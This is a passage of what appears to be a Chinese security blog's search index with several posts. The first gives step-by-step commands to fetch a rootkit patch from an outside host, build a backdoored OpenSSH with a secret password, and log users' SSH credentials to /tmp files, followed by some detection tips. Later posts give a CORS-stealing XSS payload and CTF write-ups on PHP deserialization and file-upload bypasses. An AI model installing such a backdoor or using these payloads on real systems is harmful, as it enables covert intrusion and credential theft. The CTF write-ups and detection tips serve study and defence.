href="#8-Openssh" class="headerlink" title="8.    Openssh"></a>8.    Openssh</h2><p>通过在openssh源码中插入恶意代码并进行重新编译来替换原有sshd文件。插入的恶意代码可以是将登录成功的用户密码发送到远程服务器或者记录到某个log文件中。在openssh目录中找到includes.h文件。<br>安装后门<br>环境：centos6.9<br>下载openssh-5.9p1.tar.gz<br>wget <a href="http://ftp.jaist.ac.jp/pub/OpenBSD/OpenSSH/portable/openssh-5.9p1.tar.gz" target="_blank" rel="noopener">http://ftp.jaist.ac.jp/pub/OpenBSD/OpenSSH/portable/openssh-5.9p1.tar.gz</a><br>下载后门文件<br>wget <a href="http://core.ipsecs.com/rootkit/patch-to-hack/0x06-openssh-5.9p1.patch.tar.gz" target="_blank" rel="noopener">http://core.ipsecs.com/rootkit/patch-to-hack/0x06-openssh-5.9p1.patch.tar.gz</a><br>解压  </p><blockquote><p>tar zxvf openssh-5.9p1.tar.gz<br>tar zxvf openssh-5.9p1.patch.tar.gz    </p></blockquote><p>复制patch后门文件到正常openssh里面  </p><blockquote><p>cp openssh-5.9p1.patch/sshbd5.9p1.diff openssh-5.9p1<br>patch &lt; sshbd5.9p1.diff<br> <img src="/img/%E6%8C%81%E4%B9%85%E5%8C%968.1.png" srcset="/img/loading.gif" alt="8.1">     </p></blockquote><p>修改后门密码和文件记录 vim includes.h</p><blockquote><p>int secret_ok;<br>FILE <em>f;<br>#define ILOG “/tmp/ilog”  # 记录登录到本机的用户名和密码<br>#define OLOG “/tmp/olog”  # 记录本机登录到远程的用户名和密码<br>#define SECRETPW “test” # 远程连接密码<br>#endif /</em> INCLUDES_H */    </p></blockquote><p>编译安装  </p><blockquote><p>yum install -y openssl openssl-devel pam-devel zlib zlib-devel<br>./configure –prefix=/usr/ –sysconfdir=/etc/ssh/ –with-pam –with-kerberos5<br>make clean<br>make &amp;&amp; make install<br>service sshd start （centos7：systemctl restart sshd.service）  </p></blockquote><p>攻击机连接后门<br><img src="/img/%E6%8C%81%E4%B9%85%E5%8C%968.2.png" srcset="/img/loading.gif" alt="8.2">     </p><h3 id="安全检测-5"><a href="#安全检测-5" class="headerlink" title="安全检测"></a>安全检测</h3><p>1、查看Openssh版本<br>ssh -V<br>2、查看ssh配置文件和/usr/sbin/sshd的时间<br>stat /usr/sbin/sshd<br>时间和版本都是可以修改的，所以不靠谱<br>3、查看日志<br>more /var/log/secure | grep “Accepted” | awk ‘{print $11}’ | uniq<br>4、通过strace监控sshd进程读写文件的操作<br>ps axu | grep sshd | grep -v grep #sshd父进程ID<br>strace -o sshd -ff -p 2908<br>grep open sshd* | grep -v -e No -e null -e denied| grep WR<br>5、一般的openssh后门都会将账户密码记录到文件或者发送到邮箱中<br>strings /usr/sbin/sshd |grep ‘[1-9]{1,3}.[1-9]{1,3}.’<br>strings /usr/sbin/sshd |grep ‘@’  </p>]]></content>
    
    
    
    <tags>
      
      <tag>内网</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>CORS利用面</title>
    <link href="/2019/12/02/CORS%E5%88%A9%E7%94%A8%E9%9D%A2/"/>
    <url>/2019/12/02/CORS%E5%88%A9%E7%94%A8%E9%9D%A2/</url>
    
    <content type="html"><![CDATA[<h2 id="CORS"><a href="#CORS" class="headerlink" title="CORS"></a>CORS</h2><p>CORS是一个W3C标准，全称是”跨域资源共享”（Cross-origin resource sharing）。它允许浏览器向跨源(协议 + 域名 + 端口)服务器，发出XMLHttpRequest请求，从而克服了AJAX只能同源使用的限制。</p><p>CORS需要浏览器和服务器同时支持。它的通信过程，都是浏览器自动完成，不需要用户参与。对于开发者来说，CORS通信与同源的AJAX通信没有差别，代码完全一样。浏览器一旦发现AJAX请求跨源，就会自动添加一些附加的头信息，有时还会多出一次附加的请求，但用户不会有感觉。</p><p>因此，实现CORS通信的关键是服务器。只要服务器实现了CORS接口，就可以跨源通信。</p><p> http响应头</p><blockquote><p>Access-Control-Allow-Origin：指定哪些域可以访问域资源。<br>Access-Control-Allow-Credentials：指定浏览器是否将使用请求发送cookie。仅当allow-credentials标头设置为true时，才会发送Cookie。<br>Access-Control-Allow-Methods：指定可以使用哪些HTTP请求方法（GET，PUT，DELETE等）来访问资源。  </p></blockquote><h2 id="攻击方式"><a href="#攻击方式" class="headerlink" title="攻击方式"></a>攻击方式</h2><h3 id="1-利用通配符"><a href="#1-利用通配符" class="headerlink" title="1.利用通配符*"></a>1.利用通配符*</h3><p>最常见的CORS配置错误之一是错误地使用诸如（*）之类的通配符，允许域请求资源。这通常设置为默认值，这意味着任何域都可以访问此站点上的资源。例如</p><blockquote><p>GET /api/userinfo.php<br>Host: <a href="http://www.vuln.com" target="_blank" rel="noopener">www.vuln.com</a><br>Origin: <a href="http://www.vuln.com" target="_blank" rel="noopener">www.vuln.com</a>  </p></blockquote><blockquote><p>HTTP/1.0 200 OK<br>Access-Control-Allow-Origin: *<br>Access-Control-Allow-Credentials: false  </p></blockquote><p>响应头Access-Control-Allow-Origin: *代表任何域可以访问资源。这里的 Credentials: false<br>，如果这种请求带上cookie(withCredentials = true)，是不允许的。如果需要实现带 Cookie 的跨域请求，CORS服务端需要明确的配置允许来源的域，使用任意域的配置是不合法的。浏览器会屏蔽掉返回的结果。</p><h3 id="2-服务器Access-Control-Allow-Origin等于请求的Origin"><a href="#2-服务器Access-Control-Allow-Origin等于请求的Origin" class="headerlink" title="2.服务器Access-Control-Allow-Origin等于请求的Origin"></a>2.服务器Access-Control-Allow-Origin等于请求的Origin</h3><h3 id="3-信任域通配符"><a href="#3-信任域通配符" class="headerlink" title="3.信任域通配符"></a>3.信任域通配符</h3><p>如果CORS来验证“Origin header”URL，白名单域只是“*vuln.com”</p><blockquote><p>GET /api/userinfo.php<br>Host: example.com<br>Connection: close<br>Origin: attackervuln.com  </p></blockquote><blockquote><p>HTTP/1.0 200 OK<br>Access-Control-Allow-Origin: attackervuln.com<br>Access-Control-Allow-Credentials: true  </p></blockquote><p>我们创建一个attackervuln.com域就能进行攻击。</p><h3 id="4-利用xss"><a href="#4-利用xss" class="headerlink" title="4.利用xss"></a>4.利用xss</h3><p>如果cors做白名单限制，如果能在白名单域或其中的一个子域找到xss，就能利用。</p><p>xss payload</p><pre><code>&lt;script&gt;function cors() {  var xhttp = new XMLHttpRequest();  xhttp.onreadystatechange = function() {        if (this.status == 200) {        alert(this.responseText);         document.getElementById(&quot;demo&quot;).innerHTML = this.responseText;        }  };  xhttp.open(&quot;GET&quot;, &quot;https://www.vuln.com/userifo.php&quot;, true);  xhttp.withCredentials = true;  xhttp.send();}cors();&lt;/script&gt;</code></pre><h3 id="5-浏览器解析特殊字符的URL"><a href="#5-浏览器解析特殊字符的URL" class="headerlink" title="5.浏览器解析特殊字符的URL"></a>5.浏览器解析特殊字符的URL</h3><p>此处参考：<a href="https://www.freebuf.com/articles/web/204023.html" target="_blank" rel="noopener">https://www.freebuf.com/articles/web/204023.html</a></p>]]></content>
    
    
    
    <tags>
      
      <tag>cors</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>PHP序列化</title>
    <link href="/2018/09/13/PHP%E5%BA%8F%E5%88%97%E5%8C%96/"/>
    <url>/2018/09/13/PHP%E5%BA%8F%E5%88%97%E5%8C%96/</url>
    
    <content type="html"><![CDATA[<h3 id="序列化"><a href="#序列化" class="headerlink" title="序列化"></a>序列化</h3><p> 在PHP中，序列化用于存储或传递 PHP 的值（比如数组或者类的值）的过程中，同时不丢失其类型和结构。大概就是将数组和类的值转换成字符串来传值。</p><p>序列化</p><ul><li>serialize ( mixed $value )</li></ul><p>反序列化</p><ul><li>unserialize ( mixed $value )</li></ul><h3 id="序列化例子"><a href="#序列化例子" class="headerlink" title="序列化例子"></a>序列化例子</h3><h4 id="类的序列化"><a href="#类的序列化" class="headerlink" title="类的序列化"></a>类的序列化</h4><pre><code>class test{    var $name;    var $age;    function __construct($name,$age)    {        $this -&gt; name = $name;        $this -&gt; age = $age;    }}$test1 = new test(&#39;lmt&#39;,&#39;3&#39;);echo &quot;before serialize&lt;br&gt;&quot;;var_dump($test1);echo &quot;&lt;br&gt; after serialize &lt;br&gt;&quot;;var_dump(serialize($test1));</code></pre><p>输出结果</p><blockquote><p>O:4:”test”:2:{s:4:”name”;s:3:”lmt”;s:3:”age”;s:1:”3”;}</p></blockquote><blockquote><p>O:4:”test”:2：表示，序列化的是一个类（object），类名的长度为4，类中有两个变量名</p></blockquote><h3 id="序列化相关的题"><a href="#序列化相关的题" class="headerlink" title="序列化相关的题"></a>序列化相关的题</h3><p>welcome to the bugku</p><p><a href="http://123.206.87.240:8006/test1/" target="_blank" rel="noopener">http://123.206.87.240:8006/test1/</a></p><pre><code>$user = $_GET[&quot;txt&quot;];  $file = $_GET[&quot;file&quot;];  $pass = $_GET[&quot;password&quot;];  if(isset( $user)&amp;&amp;(file_get_contents($user,&#39;r&#39;)===&quot;welcome to the bugkuctf&quot;)){   echo &quot;hello admin!&lt;br&gt;&quot;;   include($file); //hint.php  }else{   echo &quot;you are not admin ! &quot;;  }</code></pre><p>很显然想让我们利用源码去得到flag。</p><p>开始有三个变量：user,file,pass，但是我们发现这里的pass也就是password没有什么用，所以我们重点关注前两个变量。看下面的条件</p><p>（1）这里isset的意思是查看变量是否存在，即user不能为空。<br>（2）file_get_contents是把整个文件读入字符串中，这里也就是把user这个变量（user显然要是一个文件）的内容以字符串的方式读出来并且要和“welcome to the bugkuctf”完全相等（类型，内容）。</p><ul><li>file_get_contents($user,’r’)<br>（3）后面提示了我们所以我们要在满足条件之后读取file=hint.php。</li><li>include($file); //hint.php</li></ul><p>这里就要使用php伪协议了。这道题目为了解决第二个条件，要用到    “php://input”协议。<br>然后我们在文件包含出hint.PHP</p><ul><li><a href="http://120.24.86.145:8006/test1/index.php?txt=php://input&amp;file=php://filter/read=convert.base64-encode/resource=hint.php" target="_blank" rel="noopener">http://120.24.86.145:8006/test1/index.php?txt=php://input&amp;file=php://filter/read=convert.base64-encode/resource=hint.php</a></li></ul><p><img src="/img/2.png" srcset="/img/loading.gif" alt="图片"></p><p>解码：</p><pre><code>#hint.php  &lt;?php    class Flag{//flag.php        public $file;        public function __tostring(){            if(isset($this-&gt;file)){                echo file_get_contents($this-&gt;file);               echo &quot;&lt;br&gt;&quot;;          return (&quot;good&quot;);          }        }    }    ?&gt;    </code></pre><p>利用伪协议包含出index.php</p><pre><code>#index.php  &lt;?php    $txt = $_GET[&quot;txt&quot;];    $file = $_GET[&quot;file&quot;];    $password = $_GET[&quot;password&quot;];    if(isset($txt)&amp;&amp;(file_get_contents($txt,&#39;r&#39;)===&quot;welcome to the bugkuctf&quot;)){        echo &quot;hello friend!&lt;br&gt;&quot;;        if(preg_match(&quot;/flag/&quot;,$file)){           echo &quot;不能现在就给你flag哦&quot;;          exit();        }else{            include($file);             $password = unserialize($password);            echo $password;        }    }else{        echo &quot;you are not the number of bugku ! &quot;;    }    ?&gt;    &lt;!--    $user = $_GET[&quot;txt&quot;];    $file = $_GET[&quot;file&quot;];    $pass = $_GET[&quot;password&quot;];    if(isset($user)&amp;&amp;(file_get_contents($user,&#39;r&#39;)===&quot;welcome to the bugkuctf&quot;)){        echo &quot;hello admin!&lt;br&gt;&quot;;        include($file); //hint.php    }else{        echo &quot;you are not admin ! &quot;;    }     --&gt;    </code></pre><p>indep.php中 <strong>preg_match(“/flag/“,$file)</strong> 不能直接包含出flag.php</p><p>但是hint.php里有 <strong>class Flag{//flag.php</strong><br>以及</p><pre><code>include($file);       $password = unserialize($password);      echo $password;    </code></pre><p>所以这里file参数须是hint.php，因为只有在hint.php中才会包含类Flag<br>然后我们构造password把参数传进hint.php</p><pre><code>&lt;?php      class Flag{    public $file;        }        $a = new Flag();      $a-&gt;file = &quot;flag.php&quot;;      $a = serialize($a);      print_r($a);  ?&gt;  </code></pre><p>输出</p><ul><li>O:4:”Flag”:1:{s:4:”file”;s:8:”flag.php”;}</li></ul><p><img src="/img/3.png" srcset="/img/loading.gif" alt="3"></p><p><img src="/img/4.png" srcset="/img/loading.gif" alt="4"></p>]]></content>
    
    
    
    <tags>
      
      <tag>ctf</tag>
      
      <tag>序列化</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>代码审计_文件上传ctf题</title>
    <link href="/2018/09/12/%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1-%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0ctf%E9%A2%98/"/>
    <url>/2018/09/12/%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1-%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0ctf%E9%A2%98/</url>
    
    <content type="html"><![CDATA[<p>网鼎杯第二场 wafUpload</p><h5 id="题目"><a href="#题目" class="headerlink" title="题目"></a>题目</h5><pre><code>&lt;?phpm#$sandbox = &#39;/var/www/html/upload/&#39; . md5(&quot;phpIsBest&quot; . $_SERVER[&#39;REMOTE_ADDR&#39;]);$sandbox = &#39;&#39;;#@mkdir($sandbox);#@chdir($sandbox);if (!empty($_FILES[&#39;file&#39;])) {    #mime check    if (!in_array($_FILES[&#39;file&#39;][&#39;type&#39;], [&#39;image/jpeg&#39;, &#39;image/png&#39;, &#39;image/gif&#39;])) {        die(&#39;This type is not allowed!&#39;);    }else{        echo &quot;pass 1n&quot;;    }    #check filename    $file = empty($_POST[&#39;filename&#39;]) ? $_FILES[&#39;file&#39;][&#39;name&#39;] : $_POST[&#39;filename&#39;];    if (!is_array($file)) {        $file = explode(&#39;.&#39;, strtolower($file));    }    $ext = end($file);    if (!in_array($ext, [&#39;jpg&#39;, &#39;png&#39;, &#39;gif&#39;])) {        die(&#39;This file is not allowed!&#39;);    }else{        echo &quot;pass 2n&quot;;    }    $filename = reset($file) . &#39;.&#39; . $file[count($file) - 1];    if (move_uploaded_file($_FILES[&#39;file&#39;][&#39;tmp_name&#39;], $sandbox . &#39;/&#39; . $filename)) {        echo &#39;Success!&#39;;        echo &#39;filepath:&#39; . $sandbox . &#39;/&#39; . $filename;    } else {        echo &#39;Failed!&#39;;    }}show_source(__file__);?&gt;&lt;!DOCTYPE html&gt;&lt;html lang=&quot;en&quot;&gt;&lt;head&gt;    &lt;meta charset=&quot;UTF-8&quot;&gt;    &lt;title&gt;Upload Your Shell&lt;/title&gt;&lt;/head&gt;&lt;body&gt;&lt;form action=&quot;&quot; method=&quot;post&quot; enctype=&quot;multipart/form-data&quot;&gt;    &lt;label for=&quot;file&quot;&gt;Filename:&lt;/label&gt;    &lt;input type=&quot;text&quot; name=&quot;filename&quot;&gt;&lt;br&gt;    &lt;input type=&quot;file&quot; name=&quot;file&quot; id=&quot;file&quot; /&gt;    &lt;input type=&quot;submit&quot; name=&quot;submit&quot; value=&quot;Submit&quot; /&gt;&lt;/form&gt;&lt;/body&gt;&lt;/html&gt;</code></pre><h4 id="思路"><a href="#思路" class="headerlink" title="思路"></a>思路</h4><p>审计源码可以知道，代码中用 end 函数取到上传文件的后缀并判断，用 reset 函数返回的值作为文件名</p><p>根据题目，需要绕过两层判断。</p><p>1.第一层，直接抓包修改 MIME 为 image/png 就行了。</p><p>2.第二层，构造 filename 字段为数组</p><p>仔细看 html 代码中提供了一个 filename 字段，在下面这句代码的判断中，会先查看是否有直接 post 提交的 filename 字段，如果有的话就使用这个字段的值</p><blockquote><p>$file = empty($_POST[‘filename’]) ? $_FILES[‘file’][‘name’] : $_POST[‘filename’];</p></blockquote><p>如果没有POST该字段，$file变量取上传时的name，即** $_FILES[‘file’][‘name’] **</p><p>若$file文件名不是数组，就对字符串中的点号. 进行explode分割，分割成数组<br>如上传aa.bb.php会被切为</p><p>[0]  = &gt; ‘aa’</p><p>[1] =&gt; ‘bb’</p><p>[2] =&gt; ‘php’</p><p>这样的数组</p><p><strong>获取扩展名代码</strong></p><blockquote><p>$ext = end($file);</p></blockquote><p>利用了end函数，这个函数可以返回数组的最后一项。</p><p>也就返回了最后的php作为$ext，再经过判断ext是否是jpg、png、gif的一种。</p><h4 id="绕过"><a href="#绕过" class="headerlink" title="绕过"></a>绕过</h4><p>利用end reset函数的缺陷<br>举个例子：</p><pre><code>&lt;?php$arr = array();$arr[0] = &#39;first&#39;;$arr[1] = &#39;second&#39;;$arr[2] = &#39;third&#39;;var_dump($arr);echo &quot;the result of reset: &quot;.reset($arr).&quot;n&quot;;echo &quot;the result of end: &quot;.end($arr);?&gt;</code></pre><p>end 函数原本的作用就是返回数组的最后一个元素，在上面看的是正常的。但是如果我们这里把对数组赋值的顺序换一下（先给 arr[2] 赋值），可以看到结果就变了。<br>继续尝试会发现 reset 函数也是一样，第一个给数组赋值的值就是 reset 函数返回的值，并不一定是arr[0]。</p><p>所以构造playload</p><blockquote><p>filename[1] = php<br>filename[0] = png</p></blockquote><p>end取的是png能通过校验<br>在后面拼接 $filename 时候，再一次拼接到后缀名，即</p><blockquote><p>$filename = reset($file) . ‘.’ . $file[count($file) - 1];</p></blockquote><p>此时$file[count($file) - 1] 取到的就是$file[2-1]-&gt;$filename[1]<br>最后拼接出了 php.php，就达到了上传 shell 的目的。</p><p><a href="https://www.anquanke.com/post/id/164561#h2-1" target="_blank" rel="noopener">https://www.anquanke.com/post/id/164561#h2-1</a></p>]]></content>
    
    
    
    <tags>
      
      <tag>文件上传</tag>
      
      <tag>代码审计</tag>
      
      <tag>ctf</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>文件上传原理及绕过</title>
    <link href="/2018/06/09/%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0%E5%8E%9F%E7%90%86%E5%8F%8A%E7%BB%95%E8%BF%87/"/>
    <url>/2018/06/09/%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0%E5%8E%9F%E7%90%86%E5%8F%8A%E7%BB%95%E8%BF%87/</url>
    
    <content type="html"><![CDATA[<h2 id="文件上传"><a href="#文件上传" class="headerlink" title="文件上传"></a>文件上传</h2><p>文件上传本质是客户端向服务器端的POST请求，消息里面是上传的信息。前端上传页面需要指定 enctype 为 multipart/form-data 或者 Multipart/form-data 才能正常上传文件。</p><pre><code>&lt;form action=&#39;&#39; enctype=&#39;multipart/form-data&#39; method=&#39;POST&#39;&gt;&lt;input type=&#39;file&#39; name=&#39;file&#39;&gt;&lt;/form&gt;</code></pre><h2 id="漏洞成因"><a href="#漏洞成因" class="headerlink" title="漏洞成因"></a>漏洞成因</h2><ul><li><p>对于上传文件的后缀名（扩展名）没有做较为严格的限制</p></li><li><p>对于上传文件的MIMETYPE 没有做检查</p></li><li><p>权限上没有对于上传的文件的文件权限，（尤其是对于shebang类型的文件）</p></li><li><p>对于web server对于上传文件或者指定目录的行为没有做限制</p></li></ul><h2 id="绕过方式"><a href="#绕过方式" class="headerlink" title="绕过方式"></a>绕过方式</h2><h6 id="前端绕过"><a href="#前端绕过" class="headerlink" title="前端绕过"></a>前端绕过</h6><p>表单中通过onsumbit=checkfile()调用js函数来检测文件后缀名</p><ul><li>通过firebug或burp suite来绕过</li></ul><h6 id="Content-Type"><a href="#Content-Type" class="headerlink" title="Content-Type"></a>Content-Type</h6><p>HTTP协议规定了上传资源的时候在Header中加上一项文件的MIMETYPE，来识别文件类型，这个动作是由浏览器完成的，服务端可以检查此类型</p><ul><li>抓包重放绕过，修改Content-Type</li></ul><p>MIMETYPE表</p><pre><code>text/plain（纯文本）text/html（HTML文档）text/javascript（js代码）application/xhtml+xml（XHTML文档）image/gif（GIF图像）image/jpeg（JPEG图像）image/png（PNG图像）video/mpeg（MPEG动画）application/octet-stream（二进制数据）application/pdf（PDF文档）application/(编程语言) 该种语言的代码application/msword（Microsoft Word文件）message/rfc822（RFC 822形式）multipart/alternative（HTML邮件的HTML形式和纯文本形式，相同内容使用不同形式表示）application/x-www-form-urlencoded（POST方法提交的表单）multipart/form-data（POST提交时伴随文件上传的表单）</code></pre><p>######</p>]]></content>
    
    
    
    <tags>
      
      <tag>文件上传</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>Hello World</title>
    <link href="/2018/05/23/hello-world/"/>
    <url>/2018/05/23/hello-world/</url>
    
    <content type="html"><![CDATA[<p>hello world.</p>]]></content>
    
    
    
  </entry>
  
  
  
  
</search>
